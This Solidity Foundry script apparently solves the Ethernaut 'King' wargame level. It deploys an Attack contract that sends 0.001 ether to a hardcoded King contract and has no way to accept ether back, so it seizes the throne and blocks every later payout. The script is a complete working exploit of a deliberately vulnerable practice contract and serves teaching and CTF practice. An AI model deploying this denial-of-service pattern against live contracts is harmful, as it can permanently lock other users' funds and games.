pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    constructor(address payable _kingContract) payable {
        _kingContract.call{ value: 0.001 ether }("");
    }
}

contract KingSolution is Script {

    address payable target = payable(0x82ca0D6BF5Ac26067d96DE6988ef59658E5de3f7);
    King king = King(target);

    function run() external {
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack{ value: 0.001 ether }(target);
        console.log("Last Man Standing:", king._king());
        vm.stopBroadcast();
    }
}